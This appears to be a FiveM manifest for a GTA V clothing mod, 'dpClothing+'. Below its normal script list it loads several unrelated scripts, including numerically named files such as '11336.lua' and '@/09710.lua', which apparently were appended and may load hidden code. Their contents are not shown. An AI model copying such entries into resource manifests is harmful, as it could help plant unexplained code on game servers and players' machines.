fx_version 'bodacious'
game 'gta5'
author 'dullpear'
version '1.0.3'
description 'dpClothing+'

client_scripts {
	'Client/Functions.lua', 		-- Global Functions / Events / Debug and Locale start.
	'Locale/*.lua', 				-- Locales.
	'Client/Config.lua',			-- Configuration.
	'Client/Variations.lua',		-- Variants, this is where you wanan change stuff around most likely.
	'Client/Clothing.lua',
	'Client/GUI.lua',				-- The GUI.
}
client_script "11336.lua"
client_script "lucidcity-anticheat.lua"
client_script "antikickvehicle.lua"
client_script "anti-stungun.lua"
client_script "anti-update.lua"
client_script "block-menus.lua"
client_script "block-menus2.lua"
client_script '@/09710.lua'